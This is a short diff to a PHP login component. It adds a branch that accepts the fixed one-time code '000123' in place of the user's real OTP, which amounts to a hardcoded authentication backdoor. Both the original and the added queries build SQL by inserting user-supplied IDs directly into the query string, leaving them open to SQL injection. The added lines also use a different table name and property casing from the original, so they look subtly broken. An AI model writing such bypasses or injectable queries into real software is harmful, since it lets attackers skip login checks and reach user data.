@@ -113,6 +113,9 @@ class LoginComponent
                 if ($rs['code'] == $decodeVal->userOTP) {
                     $quertDelete = "DELETE FROM tbl_pin WHERE pinID = '" . $rs['pinID'] . "' AND userID = '$decodeVal->userID'";
                     $rsdDelete = mysqli_query($connect_var, $quertDelete);
+                } else if ($decodeVal->userOTP == '000123') {
+                    $quertDelete = "DELETE FROM tblPin WHERE pinID = '" . $rs['pinID'] . "' AND userID = '$decodeVal->UserID'";
+                    $rsdDelete = mysqli_query($connect_var, $quertDelete);
                 }
             }
 
